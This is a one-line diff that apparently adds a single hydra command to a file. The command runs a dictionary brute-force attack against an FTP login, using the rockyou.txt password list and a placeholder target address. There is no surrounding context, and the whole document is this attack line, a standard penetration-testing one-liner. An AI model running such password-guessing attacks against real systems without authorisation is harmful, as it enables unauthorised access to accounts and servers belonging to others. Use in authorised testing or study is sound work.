@@ -1,0 +1,1 @@
+hydra -l <user> -P rockyou.txt ftp://xx.xx.xx.xx
